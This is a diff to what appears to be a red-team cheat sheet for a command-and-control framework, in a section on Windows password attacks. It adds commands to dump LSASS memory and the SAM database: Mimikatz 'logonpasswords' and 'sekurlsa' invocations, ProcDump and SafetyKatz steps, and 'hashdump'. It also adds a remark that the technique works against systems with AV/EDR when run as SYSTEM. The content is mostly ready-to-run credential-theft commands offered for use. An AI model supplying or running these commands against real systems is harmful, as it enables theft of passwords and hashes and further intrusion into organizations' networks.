@@ -294,7 +294,13 @@ execute-assembly C:\SharpWeb.exe all
 ```
 ------------------------------------------------------------------------------------------
 ## Exfiltration - Password Attacks
+
 ### Dumping LSASS locally (all commands below require local Admin)
+Mimikatz built-in to dump passwords/hashes to console
+```
+# Works against most updated systems with AV/EDR if running as SYSTEM
+logonpasswords
+```
 Dumping LSASS with ProcDump.exe (requires touching disk) (NOTE: Might get flagged by AV and raise alerts but will often still output dump file)
 ```
 upload --> ProcDump.exe
@@ -308,9 +314,13 @@ Extract LSASS process with [SafetyKatz](https://github.com/GhostPack/SafetyKatz)
 ```
 execute-assembly C:\SafetyKatz.exe --> Dumps LSASS process to .dmp file on the local system
 ```
-Extracting passwords/hashes offline from LSASS dump using Mimikatz
+Extracting passwords/hashes offline from LSASS dump using Mimikatz (ON YOUR OWN SYSTEM!)
 ```
 mimikatz.exe log "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords /all" "sekurlsa::wdigest" exit (Run on your local box)
+```
+SAM dump built in - Injects into LSASS to dump local SAM database hashes to console
+```
+hashdump
 ```
 
 ### SAM database dump using reg.exe (requries local Admin)
